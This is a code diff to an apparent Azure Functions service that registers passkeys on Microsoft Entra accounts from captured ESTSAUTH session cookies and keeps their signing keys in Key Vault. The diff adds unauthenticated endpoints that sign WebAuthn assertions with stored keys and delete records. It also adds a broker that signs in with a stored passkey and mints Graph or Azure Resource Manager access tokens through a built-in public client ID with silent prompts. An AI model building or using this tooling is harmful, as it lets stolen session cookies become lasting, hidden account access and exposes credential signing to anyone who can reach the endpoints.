@@ -4,6 +4,7 @@ import json
 import logging
 import os
 import base64
+import binascii
 import hashlib
 import secrets
 import subprocess
@@ -11,7 +12,7 @@ import sys
 import uuid
 from datetime import UTC, datetime, timedelta
 from pathlib import Path
-from urllib.parse import quote
+from urllib.parse import parse_qs, quote, urlencode, urljoin, urlparse
 
 import azure.functions as func
 import requests
@@ -51,6 +52,8 @@ _STATUS_CONTAINER_CACHE: set[str] = set()
 _CATALOG_TABLE_CACHE: set[str] = set()
 _CAPTURE_TABLE_CACHE: set[str] = set()
 _CAPTURE_CONTAINER_CACHE: set[str] = set()
+_BUILT_IN_TOKEN_CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+_ARM_SCOPE = "https://management.azure.com/user_impersonation"
 
 
 def _get_request_body(req: func.HttpRequest) -> dict[str, object]:
@@ -89,12 +92,17 @@ def _get_body_value(body: dict[str, object], *names: str) -> object | None:
 
 
 def _resolve_user_agent(body: dict[str, object], req: func.HttpRequest) -> str:
-    return normalize_user_agent(_get_request_value(body, req, "userAgent", "useragent", "user_agent"))
+    # `user_agent` is capture provenance. Preserve the known-compatible ESTS
+    # replay profile unless the caller explicitly supplies `userAgent`.
+    return normalize_user_agent(_get_request_value(body, req, "userAgent", "useragent"))
 
 
 def _resolve_redirect_uri(body: dict[str, object], req: func.HttpRequest) -> str:
-    del body, req
-    return normalize_redirect_uri(os.getenv("PASSKEY_ENTRA_PORTAL_ORIGIN", "https://mysignins.microsoft.com"))
+    requested_redirect_uri = _get_request_value(body, req, "redirectUri", "redirecturi")
+    return normalize_redirect_uri(
+        requested_redirect_uri
+        or os.getenv("PASSKEY_ENTRA_PORTAL_ORIGIN", "https://mysignins.microsoft.com")
+    )
 
 
 def _resolve_okta_domain(body: dict[str, object], req: func.HttpRequest) -> str:
@@ -324,6 +332,11 @@ def _save_catalog_record(
     record = build_catalog_record(provider, credential)
     if extensions:
         record.update(extensions)
+    _put_catalog_record(record)
+    return record
+
+
+def _put_catalog_record(record: dict[str, object], *, etag: str | None = None) -> None:
     key_vault = record["keyVault"]
     assert isinstance(key_vault, dict)
     entity = {
@@ -356,6 +369,7 @@ def _save_catalog_record(
                 "Content-Type": "application/json",
                 "DataServiceVersion": "3.0;NetFx",
                 "MaxDataServiceVersion": "3.0;NetFx",
+                **({"If-Match": etag} if etag else {}),
             },
         ),
         json=entity,
@@ -366,7 +380,6 @@ def _save_catalog_record(
             f"Failed to save passkey catalog record '{record['recordId']}': HTTP {response.status_code}. "
             f"ResponseBody={response.text[:1000]}"
         )
-    return record
 
 
 def _list_catalog_records(*, provider: str | None = None, rp_id: str | None = None,
@@ -432,7 +445,7 @@ def _list_catalog_records(*, provider: str | None = None, rp_id: str | None = No
     return records
 
 
-def _get_catalog_record(record_id: str) -> dict[str, object] | None:
+def _get_catalog_record_entity(record_id: str) -> tuple[dict[str, object], str] | None:
     _ensure_catalog_table_exists()
     vault_name = os.getenv("PASSKEY_KEYVAULT_NAME", "").strip().lower()
     if not vault_name:
@@ -458,9 +471,41 @@ def _get_catalog_record(record_id: str) -> dict[str, object] | None:
             f"ResponseBody={response.text[:1000]}"
         )
     try:
-        return json.loads(response.json()["RecordJson"])
+        return json.loads(response.json()["RecordJson"]), response.headers.get("ETag", "*")
     except (KeyError, TypeError, json.JSONDecodeError) as exc:
         raise PasskeyValidationError(f"Passkey catalog record '{record_id}' is malformed.") from exc
+
+
+def _get_catalog_record(record_id: str) -> dict[str, object] | None:
+    result = _get_catalog_record_entity(record_id)
+    return result[0] if result else None
+
+
+def _delete_catalog_record(record_id: str) -> bool:
+    _ensure_catalog_table_exists()
+    vault_name = os.getenv("PASSKEY_KEYVAULT_NAME", "").strip().lower()
+    if not vault_name:
+        raise PasskeyValidationError("Missing required setting 'PASSKEY_KEYVAULT_NAME'.")
+    partition_key = quote(vault_name.replace("'", "''"), safe="")
+    row_key = quote(record_id.replace("'", "''"), safe="")
+    response = requests.delete(
+        f"{_get_storage_table_service_uri()}/{_get_catalog_table_name()}"
+        f"(PartitionKey='{partition_key}',RowKey='{row_key}')",
+        headers=_build_storage_headers(
+            _get_storage_access_token(),
+            Accept="application/json;odata=nometadata",
+            **{"If-Match": "*"},
+        ),
+        timeout=30,
+    )
+    if response.status_code == 404:
+        return False
+    if response.status_code not in (200, 202, 204):
+        raise PasskeyValidationError(
+            f"Failed to delete passkey catalog record '{record_id}': HTTP {response.status_code}. "
+            f"ResponseBody={response.text[:1000]}"
+        )
+    return True
 
 
 def _get_capture_table_name() -> str:
@@ -580,6 +625,27 @@ def _delete_key_vault_secret(config: object, secret_name: str) -> bool:
         return False
     if response.status_code not in (200, 202):
         raise PasskeyValidationError(f"Failed to delete Key Vault secret '{secret_name}': HTTP {response.status_code}.")
+    return True
+
+
+def _delete_key_vault_key(config: object, key_vault: dict[str, object]) -> bool:
+    vault_name = str(getattr(config, "key_vault_name", "") or "").strip()
+    key_name = str(key_vault.get("keyName") or "").strip()
+    key_id = str(key_vault.get("keyId") or "").strip()
+    if not vault_name or not key_name:
+        return False
+    expected_prefix = f"https://{vault_name}.vault.azure.net/keys/"
+    if key_id and not key_id.lower().startswith(expected_prefix.lower()):
+        raise PasskeySecurityError("Passkey signing key is outside the configured Key Vault.")
+    response = requests.delete(
+        f"https://{vault_name}.vault.azure.net/keys/{quote(key_name, safe='')}?api-version=7.4",
+        headers={"Authorization": f"Bearer {_get_key_vault_data_token(config)}"},
+        timeout=30,
+    )
+    if response.status_code == 404:
+        return False
+    if response.status_code not in (200, 202):
+        raise PasskeyValidationError(f"Failed to delete Key Vault key '{key_name}': HTTP {response.status_code}.")
     return True
 
 
@@ -936,11 +1002,15 @@ def _process_registration_queue_message(message_payload: dict[str, object]) -> d
         raise PasskeyValidationError("Queue message is missing encrypted capture context.")
     captured_payload = _decrypt_capture(capture_reference)
     user_principal_name = str(message_payload.get("userPrincipalName") or "").strip()
-    ests_auth_cookie = str(captured_payload.get("estsAuth") or captured_payload.get("estsAuthCookie") or "").strip()
+    ests_auth_cookie = str(extract_ests_auth_cookie_value(captured_payload) or "").strip()
     display_name = str(message_payload.get("displayName") or message_payload.get("passkeyDisplayName") or "").strip()
     key_vault_key_name = str(message_payload.get("keyVaultKeyName") or "").strip() or None
     user_agent = normalize_user_agent(message_payload.get("userAgent") or message_payload.get("useragent"))
-    redirect_uri = normalize_redirect_uri(os.getenv("PASSKEY_ENTRA_PORTAL_ORIGIN", "https://mysignins.microsoft.com"))
+    redirect_uri = normalize_redirect_uri(
+        message_payload.get("redirectUri")
+        or message_payload.get("redirecturi")
+        or os.getenv("PASSKEY_ENTRA_PORTAL_ORIGIN", "https://mysignins.microsoft.com")
+    )
 
     if not user_principal_name:
         raise PasskeyValidationError("Queue message is missing 'userPrincipalName'.")
@@ -1045,7 +1115,7 @@ def _apply_configured_key_vault(credential: dict[str, object], configured_vault_
 
 
 @app.function_name(name="ListPasskeyCatalogRecords")
-@app.route(route="passkeys", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
+@app.route(route="passkeys", methods=["GET"], auth_level=func.AuthLevel.ANONYMOUS)
 def list_passkey_catalog_records_http(req: func.HttpRequest) -> func.HttpResponse:
     try:
         provider = _get_request_value({}, req, "provider")
@@ -1071,7 +1141,7 @@ def list_passkey_catalog_records_http(req: func.HttpRequest) -> func.HttpRespons
 
 
 @app.function_name(name="GetPasskeyCatalogRecord")
-@app.route(route="passkeys/{recordId}", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
+@app.route(route="passkeys/{recordId}", methods=["GET"], auth_level=func.AuthLevel.ANONYMOUS)
 def get_passkey_catalog_record_http(req: func.HttpRequest) -> func.HttpResponse:
     try:
         record_id = req.route_params.get("recordId") or req.params.get("recordId")
@@ -1083,6 +1153,145 @@ def get_passkey_catalog_record_http(req: func.HttpRequest) -> func.HttpResponse:
         return _json_response(200, {"success": True, "record": record})
     except PasskeyValidationError as exc:
         return _json_response(400, {"success": False, "error": str(exc)})
+    except Exception as exc:  # noqa: BLE001
+        return _json_response(500, {"success": False, "error": str(exc)})
+
+
+@app.function_name(name="GetPasskeyBrowserContext")
+@app.route(route="passkeys/{recordId}/browser-context", methods=["GET"], auth_level=func.AuthLevel.ANONYMOUS)
+def get_passkey_browser_context_http(req: func.HttpRequest) -> func.HttpResponse:
+    try:
+        record_id = str(req.route_params.get("recordId") or "").strip()
+        if not record_id:
+            raise PasskeyValidationError("Missing required route value 'recordId'.")
+        record = _get_catalog_record(record_id)
+        if record is None:
+            return _no_store_response(404, {"success": False, "error": "Passkey was not found."})
+        if record.get("status") != "active":
+            return _no_store_response(409, {"success": False, "error": "Passkey is not active."})
+        login_context = _load_login_context(record)
+        raw_user_agent = login_context.get("userAgent") if login_context else None
+        user_agent = normalize_user_agent(raw_user_agent) if isinstance(raw_user_agent, str) and raw_user_agent.strip() else None
+        return _no_store_response(200, {
+            "success": True,
+            "browserContext": {
+                "provider": record.get("provider"),
+                "rpId": record.get("rpId"),
+                "userName": record.get("userName"),
+                "userAgent": user_agent,
+            },
+        })
+    except PasskeyValidationError as exc:
+        return _no_store_response(400, {"success": False, "error": str(exc)})
+    except Exception as exc:  # noqa: BLE001
+        return _no_store_response(500, {"success": False, "error": str(exc)})
+
+
+@app.function_name(name="DeletePasskeyCatalogRecord")
+@app.route(route="passkeys/{recordId}", methods=["DELETE"], auth_level=func.AuthLevel.ANONYMOUS)
+def delete_passkey_catalog_record_http(req: func.HttpRequest) -> func.HttpResponse:
+    try:
+        record_id = str(req.route_params.get("recordId") or "").strip()
+        if not record_id:
+            raise PasskeyValidationError("Missing required route value 'recordId'.")
+        entity = _get_catalog_record_entity(record_id)
+        if entity is None:
+            return _no_store_response(404, {"success": False, "error": "Passkey was not found."})
+        record, _etag = entity
+        config = load_config_from_environment()
+        secret_name = str(record.get("loginContextSecretName") or "")
+        deleted_login_context = bool(secret_name and _delete_key_vault_secret(config, secret_name))
+        key_vault = record.get("keyVault")
+        if not isinstance(key_vault, dict):
+            raise PasskeyValidationError("Passkey has no signing-key metadata.")
+        deleted_key = _delete_key_vault_key(config, key_vault)
+        deleted_catalog = _delete_catalog_record(record_id)
+        return _no_store_response(200, {
+            "success": True,
+            "recordId": record_id,
+            "status": "deleted",
+            "catalogDeleted": deleted_catalog,
+            "loginContextDeleted": deleted_login_context,
+            "keyDeleted": deleted_key,
+        })
+    except PasskeyValidationError as exc:
+        return _no_store_response(400, {"success": False, "error": str(exc)})
+    except Exception as exc:  # noqa: BLE001
+        return _no_store_response(500, {"success": False, "error": str(exc)})
+
+
+@app.function_name(name="AssertWithStoredPasskey")
+@app.route(route="passkeys/{recordId}/assert", methods=["POST"], auth_level=func.AuthLevel.ANONYMOUS)
+def assert_with_stored_passkey_http(req: func.HttpRequest) -> func.HttpResponse:
+    try:
+        record_id = str(req.route_params.get("recordId") or "").strip()
+        if not record_id:
+            raise PasskeyValidationError("Missing required route value 'recordId'.")
+        body = _get_request_body(req)
+        rp_id = str(body.get("rpId") or "").strip()
+        client_data_hash_text = str(body.get("clientDataHash") or "").strip()
+        user_verified = body.get("userVerified")
+        if not rp_id or not client_data_hash_text:
+            raise PasskeyValidationError("rpId and clientDataHash are required.")
+        if not isinstance(user_verified, bool):
+            raise PasskeyValidationError("userVerified must be a boolean.")
+        try:
+            client_data_hash = base64.urlsafe_b64decode(client_data_hash_text + "=" * (-len(client_data_hash_text) % 4))
+        except (ValueError, binascii.Error) as exc:
+            raise PasskeyValidationError("clientDataHash must be base64url.") from exc
+        if len(client_data_hash) != 32:
+            raise PasskeyValidationError("clientDataHash must contain exactly 32 bytes.")
+
+        entity = _get_catalog_record_entity(record_id)
+        if entity is None:
+            return _json_response(404, {"success": False, "error": "Passkey was not found."})
+        record, etag = entity
+        if record.get("status") != "active":
+            raise PasskeyValidationError("Passkey is not active.")
+        if str(record.get("rpId") or "") != rp_id:
+            return _json_response(403, {"success": False, "error": "The requested RP ID does not match this passkey."})
+        key_vault = record.get("keyVault")
+        if not isinstance(key_vault, dict):
+            raise PasskeyValidationError("Passkey has no signing-key metadata.")
+        configured_vault = os.getenv("PASSKEY_KEYVAULT_NAME", "").strip().lower()
+        key_id = str(key_vault.get("keyId") or "")
+        expected_prefix = f"https://{configured_vault}.vault.azure.net/keys/"
+        if not configured_vault or not key_id.lower().startswith(expected_prefix.lower()):
+            raise PasskeySecurityError("Passkey signing key is outside the configured Key Vault.")
+
+        sign_count = int(record.get("signCount") or 0) + 1
+        flags = 0x01 | (0x04 if user_verified else 0)
+        authenticator_data = hashlib.sha256(rp_id.encode("utf-8")).digest() + bytes([flags]) + sign_count.to_bytes(4, "big")
+        digest = hashlib.sha256(authenticator_data + client_data_hash).digest()
+        config = load_config_from_environment()
+        response = requests.post(
+            f"{key_id}/sign?api-version=7.4",
+            headers={"Authorization": f"Bearer {_get_key_vault_data_token(config)}", "Content-Type": "application/json"},
+            json={"alg": "ES256", "value": base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")},
+            timeout=30,
+        )
+        if not response.ok:
+            raise PasskeyValidationError(f"Key Vault signing failed with HTTP {response.status_code}.")
+        signature = str(response.json().get("value") or "")
+        signature_bytes = base64.urlsafe_b64decode(signature + "=" * (-len(signature) % 4))
+        if len(signature_bytes) != 64:
+            raise PasskeyValidationError("Key Vault returned an invalid ES256 signature.")
+
+        record["signCount"] = sign_count
+        record["updatedAt"] = datetime.now(UTC).isoformat().replace("+00:00", "Z")
+        _put_catalog_record(record, etag=etag)
+        return _json_response(200, {
+            "success": True,
+            "recordId": record_id,
+            "signCount": sign_count,
+            "authenticatorData": base64.urlsafe_b64encode(authenticator_data).rstrip(b"=").decode("ascii"),
+            "signature": signature,
+            "signatureFormat": "ieee-p1363",
+        })
+    except PasskeyValidationError as exc:
+        return _json_response(400, {"success": False, "error": str(exc)})
+    except PasskeySecurityError as exc:
+        return _json_response(403, {"success": False, "error": str(exc)})
     except Exception as exc:  # noqa: BLE001
         return _json_response(500, {"success": False, "error": str(exc)})
 
@@ -1171,6 +1380,274 @@ def _no_store_response(status_code: int, payload: dict[str, object]) -> func.Htt
     )
 
 
+def _get_broker_configuration() -> dict[str, object]:
+    config = load_config_from_environment()
+    client_id = os.getenv("PASSKEY_TOKEN_CLIENT_ID", "").strip()
+    if client_id:
+        try:
+            uuid.UUID(client_id)
+        except ValueError as exc:
+            raise PasskeyValidationError("PASSKEY_TOKEN_CLIENT_ID must be a GUID.") from exc
+    redirect_uri_setting = os.getenv("PASSKEY_TOKEN_REDIRECT_URI", "").strip()
+    if not redirect_uri_setting:
+        raise PasskeyValidationError("Missing required setting 'PASSKEY_TOKEN_REDIRECT_URI'.")
+    redirect_uri = normalize_redirect_uri(redirect_uri_setting)
+    graph_scopes = [
+        scope.strip()
+        for scope in os.getenv("PASSKEY_GRAPH_ALLOWED_SCOPES", "").split(",")
+        if scope.strip()
+    ] or ["User.Read"]
+    return {
+        "config": config,
+        "tenantId": config.tenant_id,
+        "tokenClientId": client_id or None,
+        "tokenRedirectUri": redirect_uri,
+        "graphAllowedScopes": graph_scopes,
+    }
+
+
+def _resolve_broker_token_request(
+    body: dict[str, object], broker: dict[str, object]
+) -> dict[str, object]:
+    profile = str(body.get("profile") or "").strip()
+    if not profile:
+        raise PasskeyValidationError("Missing required request field 'profile'.")
+    client_id = str(broker.get("tokenClientId") or _BUILT_IN_TOKEN_CLIENT_ID)
+
+    if profile.lower() == "microsoftgraph":
+        raw_scopes = body.get("scopes")
+        if raw_scopes is None or raw_scopes == []:
+            requested_scopes = ["User.Read"]
+        elif isinstance(raw_scopes, list):
+            requested_scopes = [str(scope).strip() for scope in raw_scopes if str(scope).strip()]
+        else:
+            requested_scopes = [str(raw_scopes).strip()] if str(raw_scopes).strip() else ["User.Read"]
+        allowed_scopes = [str(scope) for scope in broker["graphAllowedScopes"]]
+        allowed_by_name = {scope.lower(): scope for scope in allowed_scopes}
+        scopes: list[str] = []
+        for requested_scope in requested_scopes:
+            allowed_scope = allowed_by_name.get(requested_scope.lower())
+            if not allowed_scope:
+                raise PasskeyValidationError(
+                    f"Microsoft Graph scope '{requested_scope}' is not allowed by this broker."
+                )
+            if allowed_scope not in scopes:
+                scopes.append(allowed_scope)
+        if not scopes:
+            raise PasskeyValidationError("At least one Microsoft Graph scope is required.")
+        return {
+            "profile": "MicrosoftGraph",
+            "scopes": scopes,
+            "oauthScopes": [f"https://graph.microsoft.com/{scope}" for scope in scopes],
+            "clientId": client_id,
+        }
+
+    if profile.lower() == "azureresourcemanager":
+        raw_scopes = body.get("scopes")
+        if raw_scopes not in (None, []):
+            requested_scopes = raw_scopes if isinstance(raw_scopes, list) else [raw_scopes]
+            normalized = [str(scope).strip() for scope in requested_scopes if str(scope).strip()]
+            if len(normalized) != 1 or normalized[0].lower() != _ARM_SCOPE.lower():
+                raise PasskeyValidationError(
+                    f"AzureResourceManager only supports {_ARM_SCOPE}."
+                )
+        return {
+            "profile": "AzureResourceManager",
+            "scopes": [_ARM_SCOPE],
+            "oauthScopes": [_ARM_SCOPE],
+            "clientId": client_id,
+        }
+
+    raise PasskeyValidationError(f"Unsupported token profile '{profile}'.")
+
+
+def _get_broker_authorization_code(
+    *,
+    session: requests.Session,
+    tenant_id: str,
+    client_id: str,
+    redirect_uri: str,
+    scopes: list[str],
+    user_principal_name: str,
+    verifier: str,
+    state: str,
+    max_redirects: int = 10,
+) -> str:
+    challenge = base64.urlsafe_b64encode(
+        hashlib.sha256(verifier.encode("ascii")).digest()
+    ).rstrip(b"=").decode("ascii")
+    query = urlencode({
+        "client_id": client_id,
+        "redirect_uri": redirect_uri,
+        "response_type": "code",
+        "response_mode": "query",
+        "scope": " ".join(scopes),
+        "login_hint": user_principal_name,
+        "prompt": "none",
+        "code_challenge": challenge,
+        "code_challenge_method": "S256",
+        "state": state,
+    })
+    current_url = f"https://login.microsoftonline.com/{quote(tenant_id, safe='')}/oauth2/v2.0/authorize?{query}"
+    callback = urlparse(redirect_uri)
+
+    for _ in range(max_redirects):
+        current = urlparse(current_url)
+        if (current.scheme, current.netloc, current.path.rstrip("/")) == (
+            callback.scheme,
+            callback.netloc,
+            callback.path.rstrip("/"),
+        ):
+            values = parse_qs(current.query)
+            if values.get("error"):
+                raise RuntimeError(f"Authorization failed: {values['error'][0]}.")
+            if values.get("state", [None])[0] != state:
+                raise RuntimeError("Authorization response state validation failed.")
+            code = values.get("code", [None])[0]
+            if not code:
+                raise RuntimeError("Authorization response did not contain a code.")
+            return code
+
+        response = session.get(current_url, allow_redirects=False, timeout=60)
+        if response.status_code in (301, 302, 303, 307, 308) and response.headers.get("Location"):
+            current_url = urljoin(current_url, response.headers["Location"])
+            continue
+        raise RuntimeError(
+            f"Authorization redirect flow stopped with HTTP {response.status_code}."
+        )
+    raise RuntimeError("Authorization redirect limit was exceeded.")
+
+
+def _request_broker_access_token(
+    *,
+    session: requests.Session,
+    broker: dict[str, object],
+    token_request: dict[str, object],
+    user_principal_name: str,
+) -> dict[str, object]:
+    verifier = base64.urlsafe_b64encode(secrets.token_bytes(64)).rstrip(b"=").decode("ascii")
+    state = uuid.uuid4().hex
+    try:
+        code = _get_broker_authorization_code(
+            session=session,
+            tenant_id=str(broker["tenantId"]),
+            client_id=str(token_request["clientId"]),
+            redirect_uri=str(broker["tokenRedirectUri"]),
+            scopes=[str(scope) for scope in token_request["oauthScopes"]],
+            user_principal_name=user_principal_name,
+            verifier=verifier,
+            state=state,
+        )
+        response = session.post(
+            f"https://login.microsoftonline.com/{quote(str(broker['tenantId']), safe='')}/oauth2/v2.0/token",
+            data={
+                "client_id": token_request["clientId"],
+                "grant_type": "authorization_code",
+                "code": code,
+                "redirect_uri": broker["tokenRedirectUri"],
+                "code_verifier": verifier,
+                "scope": " ".join(str(scope) for scope in token_request["oauthScopes"]),
+            },
+            timeout=60,
+        )
+        if not response.ok:
+            raise RuntimeError(f"Token endpoint returned HTTP {response.status_code}.")
+        payload = response.json()
+        access_token = str(payload.get("access_token") or "")
+        if not access_token:
+            raise RuntimeError("Token endpoint returned no access token.")
+        expires_on = datetime.now(UTC) + timedelta(seconds=int(payload.get("expires_in") or 0))
+        return {
+            "tokenType": str(payload.get("token_type") or "Bearer"),
+            "accessToken": access_token,
+            "expiresOn": expires_on.isoformat().replace("+00:00", "Z"),
+            "tenantId": broker["tenantId"],
+            "accountId": user_principal_name,
+            "profile": token_request["profile"],
+            "scopes": token_request["scopes"],
+        }
+    finally:
+        verifier = ""
+
+
+@app.function_name(name="GetPasskeyBrokerConfiguration")
+@app.route(route="broker/config", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
+def get_passkey_broker_configuration_http(req: func.HttpRequest) -> func.HttpResponse:
+    del req
+    try:
+        broker = _get_broker_configuration()
+        return _no_store_response(200, {
+            "success": True,
+            "tenantId": broker["tenantId"],
+            "tokenClientId": broker["tokenClientId"],
+            "tokenRedirectUri": broker["tokenRedirectUri"],
+            "profiles": [
+                {
+                    "name": "MicrosoftGraph",
+                    "defaultScopes": ["User.Read"],
+                    "allowedScopes": broker["graphAllowedScopes"],
+                },
+                {
+                    "name": "AzureResourceManager",
+                    "defaultScopes": [_ARM_SCOPE],
+                    "allowedScopes": [_ARM_SCOPE],
+                },
+            ],
+        })
+    except PasskeyValidationError as exc:
+        return _no_store_response(400, {"success": False, "error": str(exc)})
+    except Exception:  # noqa: BLE001
+        logger.exception("Broker configuration is unavailable")
+        return _no_store_response(500, {"success": False, "error": "Broker configuration is unavailable."})
+
+
+@app.function_name(name="GetEntraPasskeyAccessToken")
+@app.route(route="entra/passkeys/{recordId}/token", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
+def get_entra_passkey_access_token_http(req: func.HttpRequest) -> func.HttpResponse:
+    try:
+        broker = _get_broker_configuration()
+        token_request = _resolve_broker_token_request(_get_request_body(req), broker)
+        record = _get_catalog_record(str(req.route_params.get("recordId") or ""))
+        if not record or record.get("provider") != "entra":
+            return _no_store_response(404, {"success": False, "error": "Entra passkey was not found."})
+
+        login_context = _load_login_context(record)
+        user_agent = normalize_user_agent(str(login_context.get("userAgent") or ""))
+        config = broker["config"]
+        session = requests.Session()
+        try:
+            result = authenticate_with_passkey(
+                credential=_apply_configured_key_vault(dict(record), config.key_vault_name),
+                key_vault_access_token=config.key_vault_access_token,
+                key_vault_managed_identity_client_id=config.managed_identity_client_id,
+                key_vault_tenant_id=config.tenant_id,
+                user_agent=user_agent,
+                session=session,
+                **(
+                    {"auth_url": os.getenv("PASSKEY_ENTRA_AUTH_URL", "").strip()}
+                    if os.getenv("PASSKEY_ENTRA_AUTH_URL", "").strip()
+                    else {}
+                ),
+            )
+        except Exception:  # noqa: BLE001
+            logger.warning("Stored passkey authentication failed", exc_info=True)
+            return _no_store_response(401, {"success": False, "error": "Passkey authentication failed."})
+        if not result.success:
+            return _no_store_response(401, {"success": False, "error": "Passkey authentication failed."})
+        token = _request_broker_access_token(
+            session=session,
+            broker=broker,
+            token_request=token_request,
+            user_principal_name=result.user_principal_name,
+        )
+        return _no_store_response(200, {"success": True, **token})
+    except PasskeyValidationError as exc:
+        return _no_store_response(400, {"success": False, "error": str(exc)})
+    except Exception:  # noqa: BLE001
+        logger.exception("Passkey token acquisition failed during the upstream authentication exchange")
+        return _no_store_response(502, {"success": False, "error": "Passkey token acquisition failed."})
+
+
 @app.function_name(name="ExportPasskeyLoginContext")
 @app.route(route="passkeys/{recordId}/login-context/export", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
 def export_passkey_login_context_http(req: func.HttpRequest) -> func.HttpResponse:
@@ -1249,11 +1726,11 @@ def login_with_stored_entra_passkey_http(req: func.HttpRequest) -> func.HttpResp
             user_agent=user_agent,
             **({"auth_url": os.getenv("PASSKEY_ENTRA_AUTH_URL", "").strip()} if os.getenv("PASSKEY_ENTRA_AUTH_URL", "").strip() else {}),
         )
-        return _json_response(200 if result.success else 401, {"success": result.success, "provider": "entra", "recordId": record.get("recordId"), "userPrincipalName": result.user_principal_name, "estsAuth": result.cookie_value})
+        return _no_store_response(200 if result.success else 401, {"success": result.success, "provider": "entra", "recordId": record.get("recordId"), "userPrincipalName": result.user_principal_name, "estsAuth": result.cookie_value})
     except PasskeyValidationError as exc:
-        return _json_response(400, {"success": False, "error": str(exc)})
+        return _no_store_response(400, {"success": False, "error": str(exc)})
     except Exception as exc:  # noqa: BLE001
-        return _json_response(500, {"success": False, "error": str(exc)})
+        return _no_store_response(500, {"success": False, "error": str(exc)})
 
 
 @app.function_name(name="LoginWithStoredOktaPasskey")
@@ -1352,7 +1829,7 @@ def register_entra_passkey_via_ests_auth_http(req: func.HttpRequest) -> func.Htt
         )
         capture_extensions = _persist_capture_context("entra", body, credential, user_agent)
         catalog_record = _save_catalog_record("entra", credential, capture_extensions)
-        return _json_response(
+        return _no_store_response(
             200,
             {
                 "success": True,
@@ -1365,13 +1842,13 @@ def register_entra_passkey_via_ests_auth_http(req: func.HttpRequest) -> func.Htt
             },
         )
     except PasskeyValidationError as exc:
-        return _json_response(400, {"success": False, "error": str(exc)})
+        return _no_store_response(400, {"success": False, "error": str(exc)})
     except PasskeySecurityError as exc:
         logger.exception("RegisterEntraPasskeyViaEstsAuth security failure")
-        return _json_response(500, {"success": False, "error": str(exc)})
+        return _no_store_response(500, {"success": False, "error": str(exc)})
     except Exception as exc:  # noqa: BLE001
         logger.exception("RegisterEntraPasskeyViaEstsAuth failed")
-        return _json_response(500, {"success": False, "error": str(exc)})
+        return _no_store_response(500, {"success": False, "error": str(exc)})
 
 
 @app.function_name(name="QueueEntraPasskeyRegistrationViaEstsAuth")
@@ -1580,7 +2057,7 @@ def login_with_entra_passkey_http(req: func.HttpRequest) -> func.HttpResponse:
             login_kwargs["auth_url"] = configured_auth_url
 
         result = authenticate_with_passkey(**login_kwargs)
-        return _json_response(
+        return _no_store_response(
             200 if result.success else 401,
             {
                 "success": result.success,
@@ -1594,11 +2071,11 @@ def login_with_entra_passkey_http(req: func.HttpRequest) -> func.HttpResponse:
             },
         )
     except PasskeyValidationError as exc:
-        return _json_response(400, {"success": False, "error": str(exc)})
+        return _no_store_response(400, {"success": False, "error": str(exc)})
     except PasskeySecurityError as exc:
-        return _json_response(500, {"success": False, "error": str(exc)})
+        return _no_store_response(500, {"success": False, "error": str(exc)})
     except Exception as exc:  # noqa: BLE001
-        return _json_response(500, {"success": False, "error": str(exc)})
+        return _no_store_response(500, {"success": False, "error": str(exc)})
 
 
 @app.function_name(name="StartOktaMyAccountWebAuthnRegistration")
